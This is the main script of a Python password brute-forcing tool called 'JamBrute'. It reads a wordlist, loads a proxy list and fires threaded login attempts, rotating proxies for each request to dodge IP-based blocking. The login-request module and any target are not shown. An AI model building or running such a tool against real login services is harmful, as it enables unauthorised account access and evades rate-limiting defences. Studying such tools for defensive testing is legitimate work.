from concurrent.futures import ThreadPoolExecutor 
import colorama
from colorama import Fore
import pyfiglet
from termcolor import colored
import urllib3
from src.login_reqs import LoginRequests
from src.wordlist import Wordlist
from src.proxyloader import ProxyLoader
from src.cli import parse_arguments



def start() -> None:
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    colorama.init(autoreset = True)
    
    args = parse_arguments()
    
    if args.threads > 5:
        raise ValueError("Thread count too high")
    
    # ascii banner
    text = "JamBrute"
    ascii_art = pyfiglet.figlet_format(text, font="standard", width = 150)
    print(colored(ascii_art, 'red'))

    
    # store objects 
    login = LoginRequests()
    wordlist = Wordlist(wordlist_file=args.wordlist)
    proxy_list = ProxyLoader(proxy_file=args.proxy)
    pxy = proxy_list.load_proxies() 
    wordlist.open_wordlist()
    
    
    count = 0
    length = len(pxy)
    # execute threads
    
    with ThreadPoolExecutor(max_workers = args.threads) as worker:
        for password in wordlist.passwords: #iterate through the wordlist array of passwords
            if pxy or length > 0:
                proxy = pxy[count % length]
            else:
                proxy = None
            worker.submit(login.send_login, password, proxy) # submit the threads to executor with login method and password + proxy parameters
            count += 1
        worker.shutdown(wait=True)


if __name__ == "__main__":
    start() # start call
    